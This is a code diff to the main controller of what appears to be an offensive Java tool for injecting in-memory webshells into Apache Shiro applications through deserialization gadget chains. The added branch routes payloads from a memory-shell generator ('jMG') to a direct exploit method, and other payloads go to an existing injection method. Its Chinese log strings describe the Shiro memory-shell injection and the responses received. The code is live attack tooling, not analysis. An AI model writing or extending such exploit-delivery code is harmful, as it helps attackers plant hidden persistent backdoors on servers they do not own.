@@ -1955,14 +1955,23 @@ public class MainController {
         }
         AppLogger.info("内存马 Shiro 注入: gadget=" + AttackService.gadget + ", path=" + path + ", label=" + memLabel);
 
-        String result = this.attackService.sendInjectMemToolExploit(
-                AttackService.gadget,
-                key.trim(),
-                this.lastMemshellExploitPayload,
-                pass != null ? pass : "",
-                path != null ? path : "",
-                this.memshellGeneratorOutput,
-                memLabel);
+        String result;
+        if (this.lastMemshellExploitSource != null && "jMG".equalsIgnoreCase(this.lastMemshellExploitSource.trim())) {
+            result = this.attackService.sendJmgDirectExploit(
+                    AttackService.gadget,
+                    key.trim(),
+                    this.lastMemshellExploitPayload,
+                    this.memshellGeneratorOutput);
+        } else {
+            result = this.attackService.sendInjectMemToolExploit(
+                    AttackService.gadget,
+                    key.trim(),
+                    this.lastMemshellExploitPayload,
+                    pass != null ? pass : "",
+                    path != null ? path : "",
+                    this.memshellGeneratorOutput,
+                    memLabel);
+        }
         if (result != null) {
             this.memshellGeneratorOutput.appendText("[发送结果] 已收到响应，长度=" + result.length() + "\n");
         } else {
